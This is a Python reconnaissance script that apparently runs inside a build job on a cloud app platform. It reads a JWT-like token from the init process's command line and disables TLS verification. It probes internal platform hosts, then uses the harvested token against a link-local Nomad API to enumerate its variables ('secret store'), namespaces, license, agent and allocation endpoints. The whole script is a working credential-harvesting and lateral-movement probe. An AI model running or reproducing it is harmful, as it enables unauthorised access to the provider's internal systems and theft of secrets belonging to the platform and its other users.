import socket,ssl,urllib.request as u,urllib.error,json,re
ctx=ssl._create_unverified_context()
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
def get(url,hdr=None,t=6):
    try:
        r=u.urlopen(u.Request(url,headers=hdr or {}),context=ctx,timeout=t); return r.status,r.read(400)
    except urllib.error.HTTPError as e: return e.code,e.read(300)
    except Exception as e: return -1,str(e).encode()
print('=== resolve internal app-platform hosts ===')
for h in ['userapi.amer-1.aivencloud.net','user-registry.amer-1.aivencloud.net','docker-mirror.amer-1.aivencloud.net','api.aiven.io','api.internal.aiven.io']:
    try: print(h,socket.gethostbyname(h))
    except Exception as e: print(h,'NO')
print('=== userapi probes ===')
for p in ['/','/v1/','/health','/api/','/schemas/ServiceStatus.json','/v1/service','/v1/services']:
    st,body=get('https://userapi.amer-1.aivencloud.net'+p)
    print(p,'->',st,body[:150])
print('=== NOMAD vars/variables (secret store) ===')
for ep in ['/v1/vars','/v1/variables','/v1/vars?prefix=','/v1/namespace','/v1/namespaces','/v1/regions','/v1/operator/license','/v1/agent/host','/v1/agent/pprof/','/v1/metrics?format=json']:
    st,body=get('https://169.254.1.2:4646'+ep,{'X-Nomad-Token':tok})
    print(ep,'->',st,body[:200])
print('=== Nomad allocations for MY job (token is alloc-scoped) ===')
for ep in ['/v1/job/build-01a14ad1-6495-74e0-b6f9-58949a88bbe7','/v1/namespace/user','/v1/allocation/e53ced11-e65b-1572-cbab-65189ac8f10f']:
    st,body=get('https://169.254.1.2:4646'+ep,{'X-Nomad-Token':tok})
    print(ep,'->',st,body[:250])
print('DONE')
